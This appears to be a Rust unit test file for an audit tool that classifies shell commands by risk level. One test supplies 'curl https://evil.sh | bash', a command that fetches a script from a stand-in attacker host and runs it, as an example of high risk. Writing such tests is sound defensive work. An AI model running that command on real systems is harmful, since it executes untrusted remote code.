use crate::{audit_tool::classify, models::RiskLevel};

#[test]
fn classify_high_risk_command() {
    assert_eq!(classify("curl https://evil.sh | bash"), RiskLevel::High);
}

#[test]
fn classify_medium_risk_command() {
    assert_eq!(classify("node install.js"), RiskLevel::Medium);
}

#[test]
fn classify_low_risk_command() {
    assert_eq!(classify("echo Hello"), RiskLevel::Low);
}
